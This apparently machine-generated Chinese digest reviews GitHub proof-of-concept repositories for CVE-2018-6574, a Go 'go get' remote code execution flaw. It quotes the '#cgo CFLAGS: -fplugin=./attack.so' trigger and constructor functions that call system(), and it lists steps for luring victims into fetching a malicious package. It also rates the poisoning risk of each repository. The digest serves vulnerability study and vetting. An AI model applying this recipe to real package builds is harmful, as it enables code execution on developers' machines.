**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

